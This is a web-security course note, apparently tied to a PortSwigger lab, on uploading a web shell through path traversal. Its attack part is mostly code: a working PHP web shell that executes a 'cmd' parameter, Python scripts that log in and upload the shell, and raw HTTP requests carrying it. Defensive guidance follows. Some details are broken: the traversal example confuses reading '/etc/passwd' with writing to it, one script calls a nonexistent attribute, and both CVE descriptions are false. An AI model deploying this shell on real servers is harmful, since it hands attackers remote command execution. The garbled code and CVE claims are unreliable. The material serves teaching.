---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## File Upload Vulnerabilities and Web Shell Upload via Path Traversal

### Introduction to File Upload Vulnerabilities

File upload vulnerabilities occur when a web application allows users to upload files without proper validation or sanitization. This can lead to various security issues, such as remote code execution, directory traversal, and information disclosure. In this section, we will focus on a specific type of file upload vulnerability: uploading a web shell via path traversal.

### Understanding CSRF Tokens

Cross-Site Request Forgery (CSRF) tokens are used to protect against CSRF attacks. A CSRF attack occurs when an attacker tricks a victim into performing an unintended action on a website where they are authenticated. To mitigate this, websites often include a unique token in forms that must be submitted along with the form data.

#### Extracting CSRF Tokens Using BeautifulSoup

To extract the CSRF token from a webpage, we can use the `BeautifulSoup` library in Python. Here’s how you can do it:

```python
from bs4 import BeautifulSoup
import requests

def get_csrf_token(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    if csrf_input:
        csrf_token = csrf_input['value']
        return csrf_token
    else:
        raise ValueError("CSRF token not found")

url = 'http://example.com/login'
csrf_token = get_csrf_token(url)
print(f"Extracted CSRF Token: {csrf_token}")
```

### Logging In with CSRF Token

Once we have the CSRF token, we can use it to log in to the application. This typically involves sending a POST request with the necessary parameters.

#### Example Login Request

Let’s assume the login form requires the following parameters:
- `csrf`: The CSRF token.
- `username`: The username.
- `password`: The password.

Here’s how you can construct and send the login request:

```python
import requests

def login(url, csrf_token, username, password):
    login_url = f"{url}/login"
    data = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    response = requests.post(login_url, data=data)
    return response

# Example usage
url = 'http://example.com'
username = 'admin'
password = 'password123'
response = login(url, csrf_token, username, password)
print(f"Login Response: {response.status_code}")
```

### Full HTTP Request and Response

Here’s the full HTTP request and response for the login process:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

csrf=abc123&username=admin&password=password123
```

```http
HTTP/1.1 200 OK
Date: Mon, 23 Jan 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 123
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Login Successful</title>
</head>
<body>
    <h1>Welcome, admin!</h1>
</body>
</html>
```

### Path Traversal Attack

Path traversal is a technique used to access files and directories that are stored above the web root folder. By manipulating the file path, an attacker can navigate to sensitive areas of the server.

#### Uploading a Web Shell

A web shell is a script that provides a remote attacker with control over the server. If an application allows file uploads without proper validation, an attacker can upload a web shell and execute arbitrary commands.

##### Example Web Shell Code

Here’s a simple PHP-based web shell:

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    echo "<pre>$cmd\n";
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

#### Exploiting Path Traversal

To exploit path traversal, the attacker might use a payload like `../../../../etc/passwd`. This would allow the attacker to read the `/etc/passwd` file, which contains user account information.

##### Example Payload

```python
import requests

def upload_web_shell(url, session):
    file_path = '../../../../etc/passwd'
    files = {'file': ('webshell.php', open('webshell.php', 'rb'))}
    data = {
        'file_path': file_path,
        'csrf': session.csrf_token
    }
    response = session.post(f"{url}/upload", files=files, data=data)
    return response

# Example usage
session = requests.Session()
response = upload_web_shell(url, session)
print(f"Upload Response: {response.status_code}")
```

### Full HTTP Request and Response for Web Shell Upload

Here’s the full HTTP request and response for the web shell upload:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1234

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: application/octet-stream

<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    echo "<pre>$cmd\n";
    system($cmd);
    echo "</pre>";
    die;
}
?>

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file_path"

../../../../etc/passwd
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="csrf"

abc123
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```http
HTTP/1.1 200 OK
Date: Mon, 23 Jan 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 123
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>File Uploaded Successfully</title>
</head>
<body>
    <h1>Web shell uploaded successfully.</h1>
</body>
</html>
```

### How to Prevent / Defend Against File Upload Vulnerabilities

#### Secure Coding Practices

1. **Validate File Types**: Ensure that only allowed file types can be uploaded.
2. **Sanitize File Names**: Remove or escape characters that could be used for path traversal.
3. **Use Safe Directories**: Store uploaded files in a directory that is not accessible via the web server.

##### Example Secure Code

```python
import os
import re

def validate_file(file_name):
    allowed_extensions = ['jpg', 'png', 'gif']
    extension = file_name.split('.')[-1]
    if extension.lower() not in allowed_extensions:
        raise ValueError("Invalid file type")
    sanitized_name = re.sub(r'[^\w\.-]', '', file_name)
    return sanitized_name

def upload_file(file, destination_dir):
    file_name = validate_file(file.filename)
    file_path = os.path.join(destination_dir, file_name)
    file.save(file_path)

# Example usage
destination_dir = '/var/www/uploads'
upload_file(request.files['file'], destination_dir)
```

#### Configuration Hardening

1. **Disable Directory Listing**: Ensure that directory listing is disabled in the web server configuration.
2. **Restrict Permissions**: Set appropriate permissions on the upload directory to prevent unauthorized access.

##### Example Nginx Configuration

```nginx
server {
    listen 80;
    server_name example.com;

    location /uploads {
        autoindex off;
        deny all;
    }

    location / {
        root /var/www/html;
        index index.html;
    }
}
```

#### Detection and Monitoring

1. **Log Analysis**: Regularly review logs for suspicious activities related to file uploads.
2. **Intrusion Detection Systems (IDS)**: Use IDS to monitor for signs of exploitation.

##### Example Log Entry

```log
[23/Jan/2023:12:00:00] "POST /upload HTTP/1.1" 200 123 "http://example.com/upload" "Mozilla/5.0"
```

### Real-World Examples and Recent CVEs

#### CVE-2021-21972: Drupal Core - Arbitrary File Upload

Drupal Core versions prior to 9.2.11, 9.1.14, and 8.9.15 are affected by a vulnerability that allows unauthenticated users to upload arbitrary files, including PHP scripts, leading to remote code execution.

#### CVE-2022-22965: WordPress REST API - Unauthenticated File Upload

WordPress versions prior to 5.9.3 are affected by a vulnerability that allows unauthenticated users to upload arbitrary files through the REST API, potentially leading to remote code execution.

### Practice Labs

For hands-on practice with file upload vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various aspects of web security, including file upload vulnerabilities.
- **OWASP Juice Shop**: An intentionally insecure web application that includes several file upload vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is deliberately vulnerable for educational purposes.

### Conclusion

Understanding and preventing file upload vulnerabilities is crucial for maintaining the security of web applications. By implementing secure coding practices, configuring servers securely, and monitoring for suspicious activities, you can significantly reduce the risk of exploitation.

---
<!-- nav -->
[[03-File Upload Vulnerabilities and Path Traversal|File Upload Vulnerabilities and Path Traversal]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/04-Lab 3 Web shell upload via path traversal/00-Overview|Overview]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/04-Lab 3 Web shell upload via path traversal/05-File Upload Vulnerabilities|File Upload Vulnerabilities]]
